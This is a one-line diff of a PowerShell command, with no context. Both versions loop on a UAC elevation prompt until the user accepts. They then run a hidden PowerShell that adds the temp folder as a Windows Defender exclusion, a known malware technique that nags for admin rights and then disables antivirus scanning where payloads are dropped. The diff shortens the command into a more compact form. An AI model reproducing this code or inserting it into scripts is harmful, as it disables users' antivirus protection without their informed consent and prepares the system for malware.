@@ -1,1 +1,1 @@
-while($true){try{Start-Process 'cmd.exe' -Verb runas -ArgumentList '/c', 'powershell -WindowStyle Hidden -Command Add-MpPreference -ExclusionPath %tmp%' -WindowStyle Hidden; exit}catch{}}
+while($true){try{Start-Process 'cmd' -Verb runas -Args '/c powershell -w h Add-MpPreference -ExclusionPath %tmp%';exit}catch{}}
